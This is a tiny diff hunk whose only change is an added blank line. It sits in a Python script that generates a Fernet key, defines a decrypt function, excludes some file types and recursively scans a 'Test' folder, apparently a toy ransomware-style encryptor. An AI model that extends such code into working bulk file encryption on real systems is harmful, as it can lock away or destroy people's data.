@@ -52,6 +52,7 @@ def decrypt(file, key):
 key = Fernet.generate_key()
 ### ----------
 
+
 exclude = ['.py','.pem', '.exe', '.imin']
 for item in recursiveScan(os.getcwd() + '\Test'): 
     filePath = Path(item)
